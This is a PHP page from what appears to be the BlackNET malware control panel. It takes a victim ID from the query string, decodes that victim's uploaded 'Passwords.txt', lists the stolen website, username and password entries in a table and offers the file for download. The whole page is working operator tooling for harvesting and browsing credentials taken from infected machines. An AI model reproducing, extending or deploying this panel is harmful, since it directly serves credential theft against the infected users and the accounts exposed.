<?php
include_once 'session.php';

$vicID = isset($_GET['vicid']) ? $utils->sanitize($_GET['vicid']) : '';

if (file_exists("upload/$vicID/Passwords.txt")) {
    $fn = fopen("upload/$vicID/Passwords.txt", "r");
    $text = fread($fn, filesize("upload/$vicID/Passwords.txt"));
    $text = trim(base64_decode($text));
    $lines = explode("\n", $text);
} else {
    die("Passwords file does not exist");
}

function getURL($url)
{
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $url_parase = parse_url(filter_var($url, FILTER_SANITIZE_URL));
        return $url_parase['scheme'] . "://" . $url_parase['host'] . "/";
    } elseif (filter_var($url, FILTER_VALIDATE_IP)) {
        return $url;
    } elseif ($url === "localhost") {
        return $url;
    } else {
        return "Domain does not exist";
    }
}
?>

<!DOCTYPE html>
<html>
  <head>
    <?php include_once 'components/meta.php';?>
    <title>BlackNET - View Passwords</title>
    <?php include_once 'components/css.php';?>
    <link
      href="asset/vendor/datatables/dataTables.bootstrap4.css"
      rel="stylesheet"
    />
    <link
      href="asset/vendor/responsive/css/responsive.dataTables.css"
      rel="stylesheet"
    />
    <link
      href="asset/vendor/responsive/css/responsive.bootstrap4.css"
      rel="stylesheet"
    />
  </head>

  <body id="page-top">
    <?php include_once 'components/header.php';?>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">View Passwords</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-key"></i>
              View Passwords
            </div>
            <div class="card-body">
              <div class="container">
                <div class="table-responsive pt-4 pb-4">
                  <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0" >
                    <thead>
                      <tr>
                        <th>#</th>
                        <th>Website</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <?php $i = 1;?>
                      <?php foreach ($lines as $line): ?>
                      <?php $result = explode(",", $line);?>
                      <?php if ($result[1] !== "" && $result[2] !== ""): ?>
                      <tr>
                        <td><?php echo $i; ?></td>

                        <td><?php echo getURL($result[0]); ?></td>

                        <td><?php echo $result[1]; ?></td>

                        <td><?php echo $result[2]; ?></td>
                      </tr>
                      <?php $i++;?>
                      <?php endif;?>
                      <?php endforeach;?>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
            <div class="card-footer">
              <a type="button" class="btn btn-primary" href="<?php echo "upload/$vicID/Passwords.txt"; ?>" download>Download Passwords</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <?php include_once 'components/footer.php';?>

    <?php include_once 'components/js.php';?>

    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script>
      $(document).ready(function () {
        $("#dataTable").DataTable({
            ordering: true,

            select: {
              style: "multi",
            },
          });
      });
    </script>
  </body>
</html>
